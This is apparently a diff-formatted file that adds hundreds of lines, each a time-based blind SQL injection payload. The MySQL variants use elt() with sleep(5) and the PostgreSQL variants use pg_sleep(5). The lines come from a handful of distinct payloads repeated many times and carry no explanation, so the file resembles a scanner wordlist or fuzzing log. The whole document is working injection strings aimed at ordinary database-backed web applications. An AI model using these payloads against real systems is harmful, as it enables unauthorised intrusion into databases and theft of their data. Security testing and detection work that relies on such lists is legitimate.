@@ -1,0 +1,2000 @@
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
